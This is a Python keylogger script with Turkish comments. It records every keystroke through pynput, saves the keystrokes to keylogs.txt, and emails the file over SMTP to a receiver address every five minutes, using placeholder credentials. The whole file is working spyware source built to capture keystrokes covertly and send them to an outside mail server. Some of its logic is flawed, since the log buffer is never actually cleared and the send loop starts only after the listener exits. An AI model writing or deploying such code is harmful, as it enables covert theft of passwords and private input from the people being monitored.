import smtplib
import time 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard 

log = ""

def on_press(key):
	global log 
	try:
		log +=key.char 
	except AttributeError:
		log += str(key)
		
def on_release(key):
	if key == keyboard.Key.esc:
		save_logs()
		log = ""
		
def save_logs(filename="keylogs.txt"):
	with open(filename, "a") as file:
		file.write(log)
		file.write("\n")

def send_logs(sender_email, sender_password, receiver_email, smtp_server):
	message = MIMEMultipart()
	message["From"] = sender_email
	message["To"] = receiver_email
	message["Subject"] = "Keylogger Log"
	
	with open ("keylogs.txt", "r") as file:
		body = MIMEText(file.read())
	message.attach(body)
	
	try:
		with smtplib.SMTP(smtp_server) as server:
			server.starttls()
			server.login(sender_email, sender_password)
			server.send_message(message)
			
	except smtplib.SMTPException as e:
		print("Logları gönderirken bir hata oluştu:", str(e))

def run_keylogger(sender_email, sender_password, receiver_email, smtp_server, interval):
	with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()
		
		while True:
			time.sleep(interval)
			send_logs(sender_email, sender_password, receiver_email, smtp_server)
			save_logs()
			
if __name__ == "__main__":
	sender_email = "your_sender_email@example.com"
	sender_password = "your_sender_password"
	receiver_email = "your_receiver_email@example.com"
	smtp_server = "smtp.example.com"
	interval = 300 # 5 dakika (saniye cinsinden)
	
	run_keylogger(sender_email, sender_password, receiver_email, smtp_server, interval)
